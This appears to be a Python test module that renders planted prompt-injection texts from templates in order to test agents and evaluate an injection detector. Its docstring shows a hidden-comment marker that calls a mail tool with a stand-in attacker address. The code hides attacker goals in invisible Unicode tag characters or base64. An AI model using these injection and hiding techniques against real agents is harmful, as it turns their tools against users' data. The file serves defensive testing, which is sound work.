"""Planted attacks for tests and for the detector evaluation (KS-708).

`fixtures/injections/templates.yaml` holds the attack texts. A template has a `{goal}` slot, the
thing the attacker wants in words, and a `{marker}` slot. The marker is the same goal as a tool
call, written so that a program can act on it:

    <!--ks-do:{"args":{"to":"attacker@evil.test"},"tool":"mail__send_email"}-->

The marker is for the naive agent only. That agent stands in for a model that obeys every
instruction it reads, and it needs the call in a form it can run without a model to parse
English. A detector must never be measured on a text that still has its marker, because a marker
is far easier to recognise than the attack around it. So there is one regex, `MARKER_REGEX`, and
one way to use it:

    re.sub(MARKER_REGEX, "", text, flags=re.DOTALL)      # what strip_markers() does

Group 1 of the regex is the JSON of the call, which is how `find_markers()` reads it. Nothing in
the scanner may look for the word `ks-do`.
"""

from __future__ import annotations

import base64
import json
import re
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import yaml

FIXTURES = Path(__file__).resolve().parent / "fixtures"
TEMPLATES = FIXTURES / "injections" / "templates.yaml"

MARKER_REGEX = r"<!--ks-do:(\{.*?\})-->"
MARKER = re.compile(MARKER_REGEX, re.DOTALL)

# Unicode tag characters are ASCII shifted into a block that no editor draws.
TAG_BASE = 0xE0000
ENCODINGS = ("none", "unicode_tags", "base64")


@dataclass(frozen=True)
class Call:
    """A tool call, named as Keystone names it (`<upstream>__<tool>`)."""

    tool: str
    args: dict[str, Any]


@dataclass(frozen=True)
class Goal:
    id: str
    text: str
    call: Call


@dataclass(frozen=True)
class Template:
    id: str
    family: str
    text: str
    language: str = "en"
    encode: str = "none"


def marker_for(call: Call) -> str:
    """The marker that carries `call`. The JSON has sorted keys and no spaces, so the same call
    always makes the same text."""
    payload = json.dumps(
        {"tool": call.tool, "args": call.args}, sort_keys=True, separators=(",", ":")
    )
    if "-->" in payload:
        raise ValueError("a marker cannot carry '-->', it would end its own comment")
    return f"<!--ks-do:{payload}-->"


def find_markers(text: str) -> list[Call]:
    """The calls whose markers are in `text`, in order. A marker that is not a call (bad JSON, no
    tool, arguments that are not an object) is left out."""
    found: list[Call] = []
    for match in MARKER.finditer(text):
        try:
            payload = json.loads(match.group(1))
        except ValueError:
            continue
        tool, args = payload.get("tool"), payload.get("args")
        if isinstance(tool, str) and tool and isinstance(args, dict):
            found.append(Call(tool, args))
    return found


def readable(text: str) -> str:
    """What a reader of a tool result sees of `text`: the text itself and, when it is JSON, the
    strings in it. A tool that returns an object sends JSON, where a quote or a line break inside a
    string is written with a backslash and a marker would not match as it stands."""
    try:
        parsed = json.loads(text)
    except ValueError:
        return text
    return "\n".join([text, *_strings(parsed)])


def _strings(value: Any) -> list[str]:
    if isinstance(value, str):
        return [value]
    if isinstance(value, dict):
        return [s for key, item in value.items() for s in (key, *_strings(item))]
    if isinstance(value, list):
        return [s for item in value for s in _strings(item)]
    return []


def strip_markers(text: str) -> str:
    """`text` without any marker, which is the form a detector is measured on."""
    return MARKER.sub("", text)


def load(path: Path = TEMPLATES) -> tuple[list[Template], list[Goal]]:
    """The templates and the goals of a templates file."""
    document = yaml.safe_load(path.read_text(encoding="utf-8"))
    templates = [
        Template(
            id=entry["id"],
            family=entry["family"],
            text=entry["text"],
            language=entry.get("language", "en"),
            encode=entry.get("encode", "none"),
        )
        for entry in document["templates"]
    ]
    unknown = [t.id for t in templates if t.encode not in ENCODINGS]
    if unknown:
        raise ValueError(f"unknown encoding in template {', '.join(unknown)}")
    goals = [
        Goal(
            id=entry["id"],
            text=entry["text"],
            call=Call(entry["call"]["tool"], dict(entry["call"]["args"])),
        )
        for entry in document["goals"]
    ]
    return templates, goals


def _encode(goal: str, how: str) -> str:
    if how == "unicode_tags":
        return "".join(chr(TAG_BASE + ord(c)) if 0x20 <= ord(c) <= 0x7E else c for c in goal)
    if how == "base64":
        return base64.b64encode(goal.encode()).decode()
    return goal


def render(template: Template, goal: Goal, *, marker: bool = True) -> str:
    """The attack text for a template and a goal. With `marker=False` the marker slot is empty,
    which gives what `strip_markers` would leave of the text with it."""
    text = template.text.replace("{goal}", _encode(goal.text, template.encode))
    text = text.replace("{marker}", marker_for(goal.call) if marker else "")
    return text.strip()
